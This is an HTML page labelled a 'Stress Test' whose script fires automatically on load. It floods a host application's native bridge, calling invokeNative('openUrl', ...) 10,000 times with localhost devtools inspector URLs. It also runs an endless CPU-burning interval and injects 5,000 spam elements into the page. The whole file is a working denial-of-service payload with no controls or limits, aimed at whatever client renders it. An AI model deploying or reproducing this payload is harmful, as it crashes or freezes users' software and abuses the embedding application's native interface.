<!DOCTYPE html>
<html>
<head>
    <title>Stress Test</title>
    <script>
        function floodInvokeNative() {
            if (typeof window.invokeNative === 'function') {
                for (let i = 0; i < 10000; i++) {
                    window.invokeNative('openUrl', 'http://localhost:13172/devtools/inspector.html?' + i);
                }
            } else {
                console.warn("invokeNative not available.");
            }
        }

        function cpuBurner() {
            setInterval(() => {
                for (let i = 0; i < 1e7; i++) {
                    Math.sqrt(i * Math.random());
                }
            }, 10);
        }

        function domBomber() {
            const body = document.body;
            for (let i = 0; i < 5000; i++) {
                const div = document.createElement("div");
                div.innerText = "DOM SPAM " + i;
                body.appendChild(div);
            }
        }

        window.onload = function () {
            floodInvokeNative();
            cpuBurner();
            domBomber();
            console.log("Stress test started.");
        };
    </script>
</head>
<body>
</body>
</html>
